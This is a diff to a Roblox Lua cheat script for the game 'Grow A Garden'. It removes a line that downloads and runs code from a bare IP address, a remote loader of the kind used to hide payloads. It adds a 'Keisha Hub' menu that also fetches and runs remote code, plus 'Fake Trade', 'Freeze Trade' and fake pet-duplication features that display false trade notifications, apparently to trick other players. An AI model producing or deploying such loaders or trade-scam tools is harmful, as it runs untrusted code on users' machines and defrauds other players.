@@ -1,2 +1,160 @@
-ID="ce5d6d9c-5a57-4019-9bb8-caba51c7e194";
-loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
+-- =======================================================
+-- KEISHA HUB | Made by Keisha
+-- =======================================================
+
+-- Load Rayfield
+local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
+
+-- Main Window
+local Window = Rayfield:CreateWindow({
+    Name = "💖 Keisha Hub | made by Keisha",
+    LoadingTitle = "Grow A Garden - Keisha",
+    LoadingSubtitle = "made by Keisha",
+    ConfigurationSaving = {
+        Enabled = true,
+        FolderName = "KeishaHub",
+        FileName = "Config"
+    },
+    KeySystem = false
+})
+
+-- Notify riêng cho Keisha
+local function KeishaNotify(title, content)
+    Rayfield:Notify({
+        Title = "💎 " .. title,
+        Content = content,
+        Duration = 4,
+        Image = 6031280882 -- icon crystal
+    })
+end
+
+-- =======================================================
+-- TAB: TRADE
+-- =======================================================
+local tradeTab = Window:CreateTab("💰 Trade", 6031280882)
+tradeTab:CreateSection("Freeze Trade 🔒")
+
+local toggles = {}
+local btnNames = {"Auto Accept", "Can't Cancel", "Freeze Trade", "Can't Leave"}
+for _, name in ipairs(btnNames) do
+    tradeTab:CreateToggle({
+        Name = name,
+        CurrentValue = false,
+        Callback = function(Value)
+            toggles[name] = Value
+            KeishaNotify("Trade", name .. " is now " .. (Value and "ON" or "OFF"))
+        end
+    })
+end
+
+tradeTab:CreateButton({
+    Name = "Leave Server",
+    Callback = function()
+        local TeleportService = game:GetService("TeleportService")
+        local Players = game:GetService("Players")
+        TeleportService:Teleport(game.PlaceId, Players.LocalPlayer)
+    end,
+})
+
+tradeTab:CreateSection("Fake Trade 🎭")
+tradeTab:CreateDropdown({
+    Name = "Select Pet",
+    Options = {"Kitsune", "Queen Bee", "T-Rex", "Disco Bee", "Corrupted Kitsune", "Raccoon", "Dragonfly", "Butterfly", "Spinosaurus"},
+    CurrentOption = "None",
+    Callback = function(Value) getgenv().SelectedPet = Value end,
+})
+tradeTab:CreateInput({
+    Name = "Weight (kg)",
+    PlaceholderText = "Enter kg",
+    RemoveTextAfterFocusLost = false,
+    Callback = function(Text) getgenv().SelectedKg = Text end,
+})
+tradeTab:CreateDropdown({
+    Name = "Mutation",
+    Options = {"Shiny", "Inverted", "Frozen", "Golden", "Tiny", "Ironskin", "Shocked", "Rainbow", "Radiant", "Ascended", "Tranquil", "Corrupt", "Fried"},
+    CurrentOption = "None",
+    Callback = function(Value) getgenv().SelectedMutation = Value end,
+})
+tradeTab:CreateButton({
+    Name = "Add Pet To Trade",
+    Callback = function()
+        KeishaNotify("Fake Trade", "Transferring...")
+        task.wait(2)
+        KeishaNotify("Fake Trade", "Added: " .. (getgenv().SelectedMutation or "") .. " " ..
+            (getgenv().SelectedPet or "") .. " - " .. (getgenv().SelectedKg or "") .. "kg")
+    end,
+})
+
+-- =======================================================
+-- TAB: RANDOMIZE
+-- =======================================================
+local randTab = Window:CreateTab("🎲 Randomize", 6031280882)
+randTab:CreateSection("Random System")
+
+local pets = {"Kitsune", "Queen Bee", "T-Rex", "Disco Bee", "Corrupted Kitsune", "Raccoon", "Dragonfly", "Butterfly", "Spinosaurus"}
+local mutations = {"Shiny", "Inverted", "Frozen", "Golden", "Tiny", "Ironskin", "Shocked", "Rainbow", "Radiant", "Ascended", "Tranquil", "Corrupt", "Fried"}
+
+local function pickRandom(list)
+    return list[math.random(1, #list)]
+end
+
+randTab:CreateButton({
+    Name = "🎲 Randomize Pet",
+    Callback = function()
+        local result = pickRandom(pets)
+        KeishaNotify("Random Pet", "You got: " .. result)
+    end,
+})
+randTab:CreateButton({
+    Name = "✨ Randomize Mutation",
+    Callback = function()
+        local result = pickRandom(mutations)
+        KeishaNotify("Random Mutation", "You got: " .. result)
+    end,
+})
+randTab:CreateButton({
+    Name = "🎁 Random Surprise",
+    Callback = function()
+        local pet = pickRandom(pets)
+        local mut = pickRandom(mutations)
+        KeishaNotify("Surprise!", "Your result: " .. mut .. " " .. pet)
+    end,
+})
+
+-- =======================================================
+-- TAB: SPAWNER
+-- =======================================================
+local spawnerTab = Window:CreateTab("⚡ Spawner", 6031280882)
+spawnerTab:CreateButton({
+    Name = "Run Spawner",
+    Callback = function()
+        KeishaNotify("Spawner", "Spawner started (demo)")
+    end,
+})
+
+-- =======================================================
+-- TAB: MISC
+-- =======================================================
+local miscTab = Window:CreateTab("⚙️ Misc", 6031280882)
+local dupeState = false
+miscTab:CreateToggle({
+    Name = "Detect Dupe Pet",
+    CurrentValue = false,
+    Callback = function(Value) 
+        dupeState = Value 
+        KeishaNotify("Dupe Detect", "Detect is now " .. (Value and "ON" or "OFF"))
+    end,
+})
+miscTab:CreateButton({
+    Name = "Dupe Pet (demo)",
+    Callback = function()
+        local screenGui = Instance.new("ScreenGui", game.CoreGui)
+        local blackFlash = Instance.new("Frame", screenGui)
+        blackFlash.Size = UDim2.new(1,0,1,0)
+        blackFlash.BackgroundColor3 = Color3.new(0,0,0)
+        blackFlash.BackgroundTransparency = 0.5
+        task.wait(0.5)
+        screenGui:Destroy()
+        KeishaNotify("Dupe Pet", "Dupe animation finished (demo)")
+    end,
+})
